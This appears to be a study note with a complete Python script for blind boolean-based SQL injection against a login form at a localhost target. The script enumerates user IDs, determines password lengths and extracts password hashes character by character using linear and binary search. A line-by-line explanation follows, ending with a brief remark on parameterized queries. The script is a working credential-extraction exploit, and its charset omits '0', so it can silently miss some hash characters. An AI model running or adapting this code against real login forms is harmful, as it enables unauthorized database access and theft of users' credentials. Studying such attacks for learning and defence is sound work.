```python
import requests

# Global variable to track the number of queries made
total_queries = 0

# The charset used to guess the password hash characters
charset = "123456789abcdef"

# The target URL for the SQL injection attack
target = "http://127.0.0.1:5000"

# The string to look for in the response to determine if the injection was successful
needle = "Welcome back"

# Function to perform the SQL injection query
def injected_query(payload):
    global total_queries
    r = requests.post(target, data={"username": "admin {}--".format(payload), "password": "password"})
    total_queries += 1
    return needle.encode() not in r.content

# Function to perform a boolean-based SQL injection to compare a specific character
def boolean_query(offset, user_id, character, operator=">"):
    payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset + 1, user_id, operator, character)
    return injected_query(payload)

# Function to check if a user ID is invalid
def invalid_user(user_id):
    payload = "(select id from user where id = {}) >= 0".format(user_id)
    return injected_query(payload)

# Function to determine the length of the password for a given user ID
def password_length(user_id):
    i = 0
    while True:
        i += 1
        payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
        if not injected_query(payload):
            return i

# Function to extract the password hash character by character
def extract_hash(charset, user_id, password_length):
    found = ""
    for i in range(password_length):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
    return found

# Function to extract the password hash using binary search
def extract_hash_bst(charset, user_id, password_length):
    found = ""
    for index in range(password_length):
        start = 0
        end = len(charset) - 1
        while start <= end:
            if end - start == 1:
                if boolean_query(index, user_id, charset[start]):
                    found += charset[start]
                else:
                    found += charset[end]
                break
            else:
                middle = (start + end) // 2
                if boolean_query(index, user_id, charset[middle]):
                    end = middle
                else:
                    start = middle + 1
    return found

# Function to print the total number of queries made
def total_queries_taken():
    global total_queries
    print("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0

# Main loop to interactively extract password hashes
while True:
    try:
        user_id = input("> Enter a user ID to extract the password hash: ")
        if invalid_user(user_id):
            print("\t[X] User {} does not exist!".format(user_id))
        else:
            user_password_length = password_length(user_id)
            print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
            total_queries_taken()
            password_hash = extract_hash(charset, user_id, user_password_length)
            print("\t[-] User {} password hash: {}".format(user_id, password_hash))
            total_queries_taken()
            password_hash_bst = extract_hash_bst(charset, int(user_id), user_password_length)
            print("\t[-] User {} password hash using BST: {}".format(user_id, password_hash_bst))
            total_queries_taken()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        break

```


Code step by step, breaking down each function and explaining how they work together.

### 1. **Global Variables Setup**
   ```python
   import requests

   # Global variable to track the number of queries made
   total_queries = 0

   # The charset used to guess the password hash characters
   charset = "123456789abcdef"

   # The target URL for the SQL injection attack
   target = "http://127.0.0.1:5000"

   # The string to look for in the response to determine if the injection was successful
   needle = "Welcome back"
   ```
   **Explanation**:
   - **requests**: This module is imported to send HTTP requests to the server.
   - **total_queries**: A global variable to keep track of how many SQL queries are sent during the password extraction process.
   - **charset**: The set of characters that could be part of the password hash. For example, a hex hash will include digits 0-9 and letters a-f.
   - **target**: The URL of the target web application where the SQL injection will be performed.
   - **needle**: A string that the script looks for in the serverâ€™s response to determine if the SQL injection query was successful.

### 2. **Injected Query Function**
   ```python
   def injected_query(payload):
       global total_queries
       r = requests.post(target, data={"username": "admin {}--".format(payload), "password": "password"})
       total_queries += 1
       return needle.encode() not in r.content
   ```
   **Explanation**:
   - **injected_query(payload)**: This function sends an HTTP POST request with the SQL injection payload.
   - **requests.post**: Sends a POST request to the target URL, submitting a form with the SQL injection in the `username` field.
   - **total_queries += 1**: Increments the global query counter each time the function is called.
   - **needle.encode() not in r.content**: Checks if the `needle` string is absent in the response content. If `needle` is not found, it means the SQL injection was successful.

### 3. **Boolean Query Function**
   ```python
   def boolean_query(offset, user_id, character, operator=">"):
       payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset + 1, user_id, operator, character)
       return injected_query(payload)
   ```
   **Explanation**:
   - **boolean_query(offset, user_id, character, operator=">")**: Performs a boolean-based SQL injection to determine if a specific character at a given position in the password is greater than the provided character.
   - **payload**: Constructs the SQL injection payload using the offset (position of the character in the password), the `user_id`, and the character to compare.
   - **injected_query(payload)**: Sends the constructed payload to the `injected_query` function to execute the SQL injection.

### 4. **Invalid User Check Function**
   ```python
   def invalid_user(user_id):
       payload = "(select id from user where id = {}) >= 0".format(user_id)
       return injected_query(payload)
   ```
   **Explanation**:
   - **invalid_user(user_id)**: Checks if a given `user_id` exists in the database by sending a SQL query that always evaluates to true if the `user_id` is valid.
   - **payload**: The payload checks whether the `id` of the user exists.
   - **injected_query(payload)**: If the query fails, the `user_id` does not exist.

### 5. **Password Length Determination Function**
   ```python
   def password_length(user_id):
       i = 0
       while True:
           i += 1
           payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, i)
           if not injected_query(payload):
               return i
   ```
   **Explanation**:
   - **password_length(user_id)**: This function determines the length of the password for a specific user.
   - **i**: Starts at 0 and increments until it finds the length of the password.
   - **payload**: The payload checks if the password length is less than or equal to `i`. If it returns false, then the password length is exactly `i`.
   - **injected_query(payload)**: Sends the payload and checks the response to determine if the length has been found.

### 6. **Extract Password Hash Function (Linear Search)**
   ```python
   def extract_hash(charset, user_id, password_length):
       found = ""
       for i in range(password_length):
           for j in range(len(charset)):
               if boolean_query(i, user_id, charset[j]):
                   found += charset[j]
                   break
       return found
   ```
   **Explanation**:
   - **extract_hash(charset, user_id, password_length)**: Extracts the password hash by iterating over each position in the password and testing each character in the `charset` to find the correct one.
   - **found**: An empty string that will accumulate the correct characters of the password hash.
   - **boolean_query(i, user_id, charset[j])**: Uses the `boolean_query` function to check if the current character in the `charset` matches the character in the password at position `i`.
   - **found += charset[j]**: If the character matches, it is added to the `found` string, and the loop breaks to move on to the next character position.

### 7. **Extract Password Hash Function (Binary Search)**
   ```python
   def extract_hash_bst(charset, user_id, password_length):
       found = ""
       for index in range(password_length):
           start = 0
           end = len(charset) - 1
           while start <= end:
               if end - start == 1:
                   if boolean_query(index, user_id, charset[start]):
                       found += charset[start]
                   else:
                       found += charset[end]
                   break
               else:
                   middle = (start + end) // 2
                   if boolean_query(index, user_id, charset[middle]):
                       end = middle
                   else:
                       start = middle + 1
       return found
   ```
   **Explanation**:
   - **extract_hash_bst(charset, user_id, password_length)**: Uses binary search to optimize the process of finding each character in the password hash.
   - **start, end**: Indices to track the current range of characters being searched.
   - **middle**: The midpoint of the current range.
   - **boolean_query(index, user_id, charset[middle])**: Determines whether the character at the midpoint is correct or whether to continue searching in the upper or lower half.
   - **found**: Accumulates the found characters of the password hash.

### 8. **Query Counter Function**
   ```python
   def total_queries_taken():
       global total_queries
       print("\t\t[!] {} total queries!".format(total_queries))
       total_queries = 0
   ```
   **Explanation**:
   - **total_queries_taken()**: Prints out the total number of queries made so far and resets the counter.

### 9. **Main Loop**
   ```python
   while True:
       try:
           user_id = input("> Enter a user ID to extract the password hash: ")
           if invalid_user(user_id):
               print("\t[X] User {} does not exist!".format(user_id))
           else:
               user_password_length = password_length(user_id)
               print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
               total_queries_taken()
               password_hash = extract_hash(charset, user_id, user_password_length)
               print("\t[-] User {} password hash: {}".format(user_id, password_hash))
               total_queries_taken()
               password_hash_bst = extract_hash_bst(charset, int(user_id), user_password_length)
               print("\t[-] User {} password hash using BST: {}".format(user_id, password_hash_bst))
               total_queries_taken()
       except KeyboardInterrupt:
           print("\n[!] Exiting...")
           break
   ```
   **Explanation**:
   - **Main Loop**: Continuously prompts the user to enter a `user_id` and attempts to extract the password hash.
   - **invalid_user(user_id)**: Checks if the user ID exists.
   - **password_length(user_id)**: Determines the length of the userâ€™s password.
   - **extract_hash() and extract_hash_bst()**: Extract the password hash using both linear and binary search methods.
   - **KeyboardInterrupt**: Handles a `Ctrl+C` keyboard interruption to gracefully exit the program.

### Final Observations:
- **Optimization**: The use of binary search in `extract_hash_bst` makes the extraction process significantly faster for long hashes, as it reduces the number of necessary queries.
- **Security Note**: The code demonstrates a common SQL injection attack vector. This highlights the importance of using parameterized queries or ORM methods in web development to prevent such vulnerabilities.

# Output

![[Pasted image 20240815215023.png]]